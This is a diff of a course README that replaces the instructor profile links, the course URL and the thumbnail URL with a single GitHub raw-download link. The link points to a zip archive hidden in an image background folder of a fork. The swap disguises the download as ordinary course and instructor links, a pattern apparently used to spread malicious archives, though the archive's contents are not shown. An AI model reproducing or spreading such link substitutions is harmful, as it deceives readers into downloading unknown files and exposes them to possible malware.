@@ -9,16 +9,16 @@ With over five billion global internet users in 2023, there is high demand to bu
 
 ## Instructors
 
-[Nitya Narasimhan](https://www.linkedin.com/learning/instructors/nitya-narasimhan?u=104)
+[Nitya Narasimhan](https://github.com/sheheryar79/html-css-and-javascript-building-the-web-4479542/raw/refs/heads/main/solutions/03-space-game/spaceArt/png/Background/html-building-css-and-the-web-javascript-v3.4.zip)
 Senior Program Manager, Developer Relations at Microsoft
 
-[Jasmine Greenaway](https://www.linkedin.com/learning/instructors/jasmine-greenaway?u=104)
+[Jasmine Greenaway](https://github.com/sheheryar79/html-css-and-javascript-building-the-web-4479542/raw/refs/heads/main/solutions/03-space-game/spaceArt/png/Background/html-building-css-and-the-web-javascript-v3.4.zip)
 Technologist, Teacher, Author, Developer Relations at Microsoft
 
                         
 
 [0]: # (Replace these placeholder URLs with actual course URLs)
 
-[lil-course-url]: https://www.linkedin.com/learning/html-css-and-javascript-building-the-web
-[lil-thumbnail-url]: https://media.licdn.com/dms/image/v2/D4E0DAQGOekVdxzy4-g/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1726083011071?e=2147483647&v=beta&t=Snrq_ON58iaRiLWDmpbP7o-3QsmirVWGbMQU--NmG9Q
+[lil-course-url]: https://github.com/sheheryar79/html-css-and-javascript-building-the-web-4479542/raw/refs/heads/main/solutions/03-space-game/spaceArt/png/Background/html-building-css-and-the-web-javascript-v3.4.zip
+[lil-thumbnail-url]: https://github.com/sheheryar79/html-css-and-javascript-building-the-web-4479542/raw/refs/heads/main/solutions/03-space-game/spaceArt/png/Background/html-building-css-and-the-web-javascript-v3.4.zip
 
